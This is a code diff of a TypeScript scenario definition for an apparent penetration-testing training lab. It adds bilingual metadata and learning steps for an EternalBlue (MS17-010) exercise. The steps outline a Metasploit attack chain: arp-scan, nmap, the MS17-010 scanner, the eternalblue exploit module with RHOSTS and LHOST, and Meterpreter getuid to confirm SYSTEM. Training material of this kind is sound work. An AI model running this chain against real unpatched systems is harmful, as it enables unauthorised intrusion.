@@ -13,7 +13,13 @@ export const SCENARIO_TEMPLATES_ETERNAL = {
   eternalBlue: () => ({
     id: 'scenario-03',
     name: 'EternalBlue — MS17-010',
-    description: 'Explotación EternalBlue en Windows 7 sin parchear mediante Metasploit.',
+    // Metadata for LandingPage cards
+    tagline: 'Exploit MS17-010 with Metasploit. Get SYSTEM on an unpatched Windows 7.',
+    taglineEs: 'Explota MS17-010 con Metasploit. Obtén SYSTEM en un Windows 7 sin parchear.',
+    tools: ['arp-scan', 'nmap', 'msfconsole'],
+    accentColor: '#f87171',
+    description: 'EternalBlue exploitation on unpatched Windows 7 using Metasploit.',
+    descriptionEs: 'Explotación EternalBlue en Windows 7 sin parchear mediante Metasploit.',
     difficulty: 'Medium' as const,
     category: 'Network' as const,
     networkRange: '172.16.0.0/24',
@@ -46,11 +52,11 @@ export const SCENARIO_TEMPLATES_ETERNAL = {
       ],
     },
     learningSteps: [
-      { task: 'Reconocimiento de red', text: 'Descubrir hosts: arp-scan <network/cidr>', discoveryLevel: 1 },
-      { task: 'Escaneo de puertos', text: 'Identificar servicios: nmap -sV <target-ip>', discoveryLevel: 2 },
-      { task: 'Verificar vulnerabilidad', text: 'msfconsole: use auxiliary/scanner/smb/smb_ms17_010 → set RHOSTS → run', discoveryLevel: 2 },
-      { task: 'Explotar EternalBlue', text: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS/LHOST → exploit', discoveryLevel: 3 },
-      { task: 'Verificar acceso SYSTEM', text: 'meterpreter: getuid', discoveryLevel: 4 },
+      { task: 'Network Reconnaissance', taskEs: 'Reconocimiento de red', text: 'Discover hosts: arp-scan <network/cidr>', textEs: 'Descubrir hosts: arp-scan <network/cidr>', discoveryLevel: 1 },
+      { task: 'Port Scanning', taskEs: 'Escaneo de puertos', text: 'Identify services: nmap -sV <target-ip>', textEs: 'Identificar servicios: nmap -sV <target-ip>', discoveryLevel: 2 },
+      { task: 'Verify Vulnerability', taskEs: 'Verificar vulnerabilidad', text: 'msfconsole: use auxiliary/scanner/smb/smb_ms17_010 → set RHOSTS → run', textEs: 'msfconsole: use auxiliary/scanner/smb/smb_ms17_010 → set RHOSTS → run', discoveryLevel: 2 },
+      { task: 'Exploit EternalBlue', taskEs: 'Explotar EternalBlue', text: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS/LHOST → exploit', textEs: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS/LHOST → exploit', discoveryLevel: 3 },
+      { task: 'Verify SYSTEM Access', taskEs: 'Verificar acceso SYSTEM', text: 'meterpreter: getuid', textEs: 'meterpreter: getuid', discoveryLevel: 4 },
     ],
   }),
 };
